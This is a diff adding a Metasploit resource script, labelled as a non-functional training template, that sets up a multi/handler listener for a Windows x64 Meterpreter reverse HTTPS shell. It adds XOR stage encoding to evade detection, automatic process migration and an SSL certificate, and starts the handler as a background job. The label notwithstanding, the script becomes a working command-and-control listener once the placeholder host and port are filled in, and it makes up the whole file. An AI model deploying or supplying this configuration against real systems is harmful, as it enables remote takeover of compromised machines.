@@ -1,0 +1,12 @@
+# Multi Handler Template
+# For Training Use – Non-functional Template
+
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_https
+set LHOST <LHOST>
+set LPORT <LPORT>
+set EnableStageEncoding true
+set StageEncoder x64/xor_dynamic
+set AutoRunScript post/windows/manage/migrate
+set HandlerSSLCert /tmp/cert.pem
+exploit -j
